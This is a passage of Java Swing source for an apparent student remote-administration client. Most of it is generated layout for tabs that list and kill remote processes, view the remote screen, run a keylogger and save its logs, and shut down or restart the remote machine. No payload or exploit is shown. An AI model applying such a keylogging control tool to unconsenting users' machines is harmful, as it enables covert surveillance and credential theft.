package team6.client.gui;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.logging.Logger;
import java.util.logging.Level;
import java.net.Socket;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableCellRenderer;
import team6.client.handler.*;

public class ControlGUI extends javax.swing.JFrame {

    private HomeGUI homeGUI;
    public Socket socket;
    public volatile int selectedTab;

    private Processes processes;
    private Applications applications;
    private Monitor monitor;
    private Keylogger keyLogger;
    private SystemCtrl systemCtrl;

    public ControlGUI(HomeGUI homeGUI, Socket socket) throws IOException {
        initComponents();
        this.homeGUI = homeGUI;
        this.socket = socket;

        processes = new Processes(this, new Socket(socket.getInetAddress(), socket.getPort()));
        applications = new Applications(this, new Socket(socket.getInetAddress(), socket.getPort()));
        monitor = new Monitor(this, new Socket(socket.getInetAddress(), socket.getPort()));
        keyLogger = new Keylogger(this, new Socket(socket.getInetAddress(), socket.getPort()));
        systemCtrl = new SystemCtrl(this, new Socket(socket.getInetAddress(), socket.getPort()));

        setSelectedTab(-1);
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        fileChooserGUI = new javax.swing.JFileChooser();
        startAppGUI = new javax.swing.JFrame();
        jLabel2 = new javax.swing.JLabel();
        jSeparator2 = new javax.swing.JSeparator();
        jScrollPane5 = new javax.swing.JScrollPane();
        tblStartApp = new javax.swing.JTable();
        btnStartAppBySelection = new javax.swing.JButton();
        txtStartApp = new javax.swing.JTextField();
        btnStartAppByName = new javax.swing.JButton();
        startProcGUI = new javax.swing.JFrame();
        jLabel3 = new javax.swing.JLabel();
        jSeparator3 = new javax.swing.JSeparator();
        jScrollPane6 = new javax.swing.JScrollPane();
        tblStartProc = new javax.swing.JTable();
        btnStartProcBySelection = new javax.swing.JButton();
        txtStartProc = new javax.swing.JTextField();
        btnStartProcByName = new javax.swing.JButton();
        tabMain = new javax.swing.JTabbedPane();
        pnlProcess = new javax.swing.JPanel();
        btnKillProc = new javax.swing.JButton();
        btnOpenStartProc = new javax.swing.JButton();
        btnDirProc = new javax.swing.JButton();
        jScrollPane4 = new javax.swing.JScrollPane();
        tblProcess = new javax.swing.JTable();
        btnSaveProc = new javax.swing.JButton();
        pnlApp = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        tblApp = new javax.swing.JTable();
        btnKillApp = new javax.swing.JButton();
        btnOpenStartApp = new javax.swing.JButton();
        btnSaveApp = new javax.swing.JButton();
        btnDirApp = new javax.swing.JButton();
        pnlMonitor = new javax.swing.JPanel();
        pnlCenterMonitor = new javax.swing.JPanel();
        btnSaveMonitor = new javax.swing.JButton();
        btnDirMonitor = new javax.swing.JButton();
        pnlKeylog = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        txtKeylog = new javax.swing.JTextArea();
        btnDirKey = new javax.swing.JButton();
        btnKeyLog = new javax.swing.JToggleButton();
        btnSaveKey = new javax.swing.JButton();
        btnClearKeyLog = new javax.swing.JButton();
        pnlSystem = new javax.swing.JPanel();
        pnlSystemInfo = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jScrollPane1 = new javax.swing.JScrollPane();
        txtSystemInfo = new javax.swing.JTextArea();
        btnDirInfo = new javax.swing.JButton();
        btnSaveInfo = new javax.swing.JButton();
        jSeparator4 = new javax.swing.JSeparator();
        pnlSystemCmd = new javax.swing.JPanel();
        btnLogOut = new javax.swing.JButton();
        btnRestart = new javax.swing.JButton();
        btnShutdown = new javax.swing.JButton();
        jSeparator1 = new javax.swing.JSeparator();

        fileChooserGUI.setApproveButtonToolTipText("");
        fileChooserGUI.setBackground(java.awt.Color.lightGray);
        fileChooserGUI.setDialogTitle("Choose Directory");
        fileChooserGUI.setFileSelectionMode(javax.swing.JFileChooser.DIRECTORIES_ONLY);
        fileChooserGUI.setFocusable(false);

        startAppGUI.setTitle("Start application");
        startAppGUI.setFocusable(false);
        startAppGUI.setPreferredSize(new java.awt.Dimension(410, 460));
        startAppGUI.setResizable(false);
        startAppGUI.setSize(new java.awt.Dimension(410, 460));
        startAppGUI.addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                startAppGUIWindowClosing(evt);
            }
        });
        startAppGUI.getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jLabel2.setFont(new java.awt.Font("Segoe UI", 1, 14)); // NOI18N
        jLabel2.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel2.setText("START APPLICATIONS");
        startAppGUI.getContentPane().add(jLabel2, new org.netbeans.lib.awtextra.AbsoluteConstraints(118, 6, 169, 32));
        startAppGUI.getContentPane().add(jSeparator2, new org.netbeans.lib.awtextra.AbsoluteConstraints(29, 44, 344, -1));

        tblStartApp.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Name"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.String.class
            };
            boolean[] canEdit = new boolean [] {
                false
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit [columnIndex];
            }
        });
        tblStartApp.setFocusable(false);
        tblStartApp.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_SELECTION);
        jScrollPane5.setViewportView(tblStartApp);
        if (tblStartApp.getColumnModel().getColumnCount() > 0) {
            tblStartApp.getColumnModel().getColumn(0).setResizable(false);
        }

        startAppGUI.getContentPane().add(jScrollPane5, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 120, 344, 230));

        btnStartAppBySelection.setText("Start by selection");
        btnStartAppBySelection.setFocusable(false);
        btnStartAppBySelection.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStartAppBySelectionActionPerformed(evt);
            }
        });
        startAppGUI.getContentPane().add(btnStartAppBySelection, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 370, -1, 32));
        startAppGUI.getContentPane().add(txtStartApp, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 70, 230, 30));

        btnStartAppByName.setText("Start By Name");
        btnStartAppByName.setFocusable(false);
        btnStartAppByName.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStartAppByNameActionPerformed(evt);
            }
        });
        startAppGUI.getContentPane().add(btnStartAppByName, new org.netbeans.lib.awtextra.AbsoluteConstraints(266, 70, 110, 30));

        startAppGUI.pack();

        startProcGUI.setTitle("Start process");
        startProcGUI.setFocusable(false);
        startProcGUI.setPreferredSize(new java.awt.Dimension(410, 460));
        startProcGUI.setResizable(false);
        startProcGUI.setSize(new java.awt.Dimension(410, 460));
        startProcGUI.addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                startProcGUIWindowClosing(evt);
            }
        });
        startProcGUI.getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jLabel3.setFont(new java.awt.Font("Segoe UI", 1, 14)); // NOI18N
        jLabel3.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel3.setText("START PROCESSES");
        startProcGUI.getContentPane().add(jLabel3, new org.netbeans.lib.awtextra.AbsoluteConstraints(120, 10, 169, 32));
        startProcGUI.getContentPane().add(jSeparator3, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 40, 344, 20));

        tblStartProc.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Name"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.String.class
            };
            boolean[] canEdit = new boolean [] {
                false
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit [columnIndex];
            }
        });
        tblStartProc.setFocusable(false);
        tblStartProc.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_SELECTION);
        jScrollPane6.setViewportView(tblStartProc);
        if (tblStartProc.getColumnModel().getColumnCount() > 0) {
            tblStartProc.getColumnModel().getColumn(0).setResizable(false);
        }

        startProcGUI.getContentPane().add(jScrollPane6, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 110, 344, 230));

        btnStartProcBySelection.setText("Start by selection");
        btnStartProcBySelection.setFocusable(false);
        btnStartProcBySelection.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStartProcBySelectionActionPerformed(evt);
            }
        });
        startProcGUI.getContentPane().add(btnStartProcBySelection, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 360, -1, 32));
        startProcGUI.getContentPane().add(txtStartProc, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 60, 220, 30));

        btnStartProcByName.setText("Start by name");
        btnStartProcByName.setFocusable(false);
        btnStartProcByName.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnStartProcByNameActionPerformed(evt);
            }
        });
        startProcGUI.getContentPane().add(btnStartProcByName, new org.netbeans.lib.awtextra.AbsoluteConstraints(270, 60, -1, 30));

        startAppGUI.pack();

        setResizable(false);
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        tabMain.setTabPlacement(javax.swing.JTabbedPane.LEFT);
        tabMain.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        tabMain.setDebugGraphicsOptions(javax.swing.DebugGraphics.NONE_OPTION);
        tabMain.setName(""); // NOI18N
        tabMain.addChangeListener(new javax.swing.event.ChangeListener() {
            public void stateChanged(javax.swing.event.ChangeEvent evt) {
                tabMainStateChanged(evt);
            }
        });

        btnKillProc.setText("Kill process");
        btnKillProc.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnKillProc.setFocusable(false);
        btnKillProc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnKillProcActionPerformed(evt);
            }
        });

        btnOpenStartProc.setText("Start process");
        btnOpenStartProc.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnOpenStartProc.setFocusable(false);
        btnOpenStartProc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnOpenStartProcActionPerformed(evt);
            }
        });

        btnDirProc.setText("Change dir");
        btnDirProc.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnDirProc.setFocusable(false);
        btnDirProc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDirProcActionPerformed(evt);
            }
        });

        tblProcess.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Name", "PID", "CPU", "RAM"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.String.class
            };
            boolean[] canEdit = new boolean [] {
                false, false, false, false
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit [columnIndex];
            }
        });
        tblProcess.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        tblProcess.setFocusable(false);
        tblProcess.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_SELECTION);
        jScrollPane4.setViewportView(tblProcess);
        if (tblProcess.getColumnModel().getColumnCount() > 0) {
            tblProcess.getColumnModel().getColumn(1).setResizable(false);
            tblProcess.getColumnModel().getColumn(2).setResizable(false);
            tblProcess.getColumnModel().getColumn(3).setResizable(false);
        }
        for (int i = 1; i < 4; i++) {
            DefaultTableCellRenderer centerRenderer = new DefaultTableCellRenderer();
            centerRenderer.setHorizontalAlignment( JLabel.CENTER );
            tblProcess.getColumnModel().getColumn(i).setCellRenderer( centerRenderer );
        }

        btnSaveProc.setText("Save logs");
        btnSaveProc.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSaveProc.setFocusable(false);
        btnSaveProc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveProcActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout pnlProcessLayout = new javax.swing.GroupLayout(pnlProcess);
        pnlProcess.setLayout(pnlProcessLayout);
        pnlProcessLayout.setHorizontalGroup(
            pnlProcessLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, pnlProcessLayout.createSequentialGroup()
                .addContainerGap(15, Short.MAX_VALUE)
                .addComponent(btnOpenStartProc, javax.swing.GroupLayout.PREFERRED_SIZE, 105, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(btnKillProc, javax.swing.GroupLayout.PREFERRED_SIZE, 105, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(354, 354, 354)
                .addComponent(btnDirProc, javax.swing.GroupLayout.PREFERRED_SIZE, 95, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(btnSaveProc, javax.swing.GroupLayout.PREFERRED_SIZE, 90, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18))
            .addGroup(pnlProcessLayout.createSequentialGroup()
                .addGap(15, 15, 15)
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 761, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        pnlProcessLayout.setVerticalGroup(
            pnlProcessLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, pnlProcessLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.PREFERRED_SIZE, 444, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(pnlProcessLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(pnlProcessLayout.createSequentialGroup()
                        .addGroup(pnlProcessLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(btnKillProc, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(btnOpenStartProc, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addGap(1, 1, 1))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, pnlProcessLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(btnDirProc, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(btnSaveProc, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(17, 17, 17))
        );

        tabMain.addTab("Processes", pnlProcess);

        tblApp.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Name", "ID", "CPU", "RAM"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.String.class
            };
            boolean[] canEdit = new boolean [] {
                false, false, false, false
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit [columnIndex];
            }
        });
        tblApp.setFocusable(false);
        tblApp.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_SELECTION);
        tblApp.setShowGrid(false);
        tblApp.getTableHeader().setReorderingAllowed(false);
        jScrollPane2.setViewportView(tblApp);
        if (tblApp.getColumnModel().getColumnCount() > 0) {
            tblApp.getColumnModel().getColumn(1).setResizable(false);
            tblApp.getColumnModel().getColumn(2).setResizable(false);
            tblApp.getColumnModel().getColumn(3).setResizable(false);
        }
        for (int i = 1; i < 4; i++) {
            DefaultTableCellRenderer centerRenderer = new DefaultTableCellRenderer();
            centerRenderer.setHorizontalAlignment( JLabel.CENTER );
            tblApp.getColumnModel().getColumn(i).setCellRenderer( centerRenderer );
        }

        btnKillApp.setText("Kill app");
        btnKillApp.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnKillApp.setFocusable(false);
        btnKillApp.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnKillAppActionPerformed(evt);
            }
        });

        btnOpenStartApp.setText("Start app");
        btnOpenStartApp.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnOpenStartApp.setFocusable(false);
        btnOpenStartApp.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnOpenStartAppActionPerformed(evt);
            }
        });

        btnSaveApp.setText("Save logs");
        btnSaveApp.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSaveApp.setFocusable(false);
        btnSaveApp.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveAppActionPerformed(evt);
            }
        });

        btnDirApp.setText("Change dir");
        btnDirApp.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnDirApp.setFocusable(false);
        btnDirApp.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDirAppActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout pnlAppLayout = new javax.swing.GroupLayout(pnlApp);
        pnlApp.setLayout(pnlAppLayout);
        pnlAppLayout.setHorizontalGroup(
            pnlAppLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
            .addGroup(pnlAppLayout.createSequentialGroup()
                .addGap(0, 12, Short.MAX_VALUE)
                .addGroup(pnlAppLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 762, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(pnlAppLayout.createSequentialGroup()
                        .addComponent(btnOpenStartApp, javax.swing.GroupLayout.PREFERRED_SIZE, 105, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(btnKillApp, javax.swing.GroupLayout.PREFERRED_SIZE, 105, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(btnDirApp, javax.swing.GroupLayout.PREFERRED_SIZE, 95, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(btnSaveApp, javax.swing.GroupLayout.PREFERRED_SIZE, 90, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(20, 20, 20))
        );
        pnlAppLayout.setVerticalGroup(
            pnlAppLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlAppLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 446, Short.MAX_VALUE)
                .addGap(18, 18, 18)
                .addGroup(pnlAppLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(btnSaveApp, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnKillApp, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnOpenStartApp, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnDirApp, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(16, 16, 16))
        );

        tabMain.addTab("Applications", pnlApp);

        pnlCenterMonitor.setFocusable(false);

        javax.swing.GroupLayout pnlCenterMonitorLayout = new javax.swing.GroupLayout(pnlCenterMonitor);
        pnlCenterMonitor.setLayout(pnlCenterMonitorLayout);
        pnlCenterMonitorLayout.setHorizontalGroup(
            pnlCenterMonitorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 761, Short.MAX_VALUE)
        );
        pnlCenterMonitorLayout.setVerticalGroup(
            pnlCenterMonitorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 433, Short.MAX_VALUE)
        );

        btnSaveMonitor.setText("Save picture");
        btnSaveMonitor.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSaveMonitor.setFocusable(false);
        btnSaveMonitor.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveMonitorActionPerformed(evt);
            }
        });

        btnDirMonitor.setText("Change dir");
        btnDirMonitor.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnDirMonitor.setFocusable(false);
        btnDirMonitor.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDirMonitorActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout pnlMonitorLayout = new javax.swing.GroupLayout(pnlMonitor);
        pnlMonitor.setLayout(pnlMonitorLayout);
        pnlMonitorLayout.setHorizontalGroup(
            pnlMonitorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlMonitorLayout.createSequentialGroup()
                .addContainerGap(16, Short.MAX_VALUE)
                .addGroup(pnlMonitorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(pnlMonitorLayout.createSequentialGroup()
                        .addComponent(btnDirMonitor, javax.swing.GroupLayout.PREFERRED_SIZE, 95, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(btnSaveMonitor, javax.swing.GroupLayout.PREFERRED_SIZE, 100, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(pnlCenterMonitor, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(17, 17, 17))
        );
        pnlMonitorLayout.setVerticalGroup(
            pnlMonitorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlMonitorLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(pnlCenterMonitor, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(pnlMonitorLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(btnDirMonitor, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnSaveMonitor, javax.swing.GroupLayout.PREFERRED_SIZE, 35, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(9, 9, 9))
        );

        tabMain.addTab("Monitor", pnlMonitor);

        jScrollPane3.setFocusable(false);

        txtKeylog.setEditable(false);
        txtKeylog.setColumns(20);
        txtKeylog.setLineWrap(true);
        txtKeylog.setRows(5);
        txtKeylog.setWrapStyleWord(true);
        txtKeylog.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        txtKeylog.setFocusable(false);
        jScrollPane3.setViewportView(txtKeylog);

        btnDirKey.setText("Save logs");
        btnDirKey.setToolTipText("");
        btnDirKey.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnDirKey.setFocusable(false);
        btnDirKey.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDirKeyActionPerformed(evt);
            }
        });

        btnKeyLog.setFont(new java.awt.Font("Segoe UI", 0, 14)); // NOI18N
        btnKeyLog.setText("START");
        btnKeyLog.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnKeyLog.setFocusable(false);
        btnKeyLog.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnKeyLogActionPerformed(evt);
            }
        });

        btnSaveKey.setText("Change dir");
        btnSaveKey.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSaveKey.setFocusable(false);
        btnSaveKey.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveKeyActionPerformed(evt);
            }
        });

        btnClearKeyLog.setText("Clear");
        btnClearKeyLog.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnClearKeyLog.setFocusable(false);
        btnClearKeyLog.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnClearKeyLogActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout pnlKeylogLayout = new javax.swing.GroupLayout(pnlKeylog);
        pnlKeylog.setLayout(pnlKeylogLayout);
        pnlKeylogLayout.setHorizontalGroup(
            pnlKeylogLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlKeylogLayout.createSequentialGroup()
                .addGap(37, 37, 37)
                .addGroup(pnlKeylogLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(pnlKeylogLayout.createSequentialGroup()
                        .addComponent(btnClearKeyLog, javax.swing.GroupLayout.PREFERRED_SIZE, 95, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(btnKeyLog, javax.swing.GroupLayout.PREFERRED_SIZE, 110, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(125, 125, 125)
                        .addComponent(btnSaveKey, javax.swing.GroupLayout.PREFERRED_SIZE, 95, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(btnDirKey, javax.swing.GroupLayout.PREFERRED_SIZE, 90, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 715, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(42, Short.MAX_VALUE))
        );
        pnlKeylogLayout.setVerticalGroup(
            pnlKeylogLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(pnlKeylogLayout.createSequentialGroup()
                .addGap(19, 19, 19)
                .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 417, Short.MAX_VALUE)
                .addGap(18, 18, 18)
                .addGroup(pnlKeylogLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(btnClearKeyLog, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnSaveKey, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnKeyLog, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnDirKey, javax.swing.GroupLayout.PREFERRED_SIZE, 32, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(18, 18, 18))
        );

        tabMain.addTab("Keylogging", pnlKeylog);

        jLabel1.setFont(new java.awt.Font("Segoe UI", 0, 18)); // NOI18N
        jLabel1.setText("COM System Information:");

        txtSystemInfo.setEditable(false);
        txtSystemInfo.setColumns(20);
        txtSystemInfo.setLineWrap(true);
        txtSystemInfo.setRows(5);
        txtSystemInfo.setTabSize(16);
        txtSystemInfo.setWrapStyleWord(true);
        txtSystemInfo.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        txtSystemInfo.setFocusable(false);
        txtSystemInfo.setSelectionColor(new java.awt.Color(255, 255, 255));
        jScrollPane1.setViewportView(txtSystemInfo);

        btnDirInfo.setText("Change dir");
        btnDirInfo.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnDirInfo.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDirInfoActionPerformed(evt);
            }
        });

        btnSaveInfo.setText("Save info");
        btnSaveInfo.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSaveInfo.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveInfoActionPerformed(evt);
            }
        });

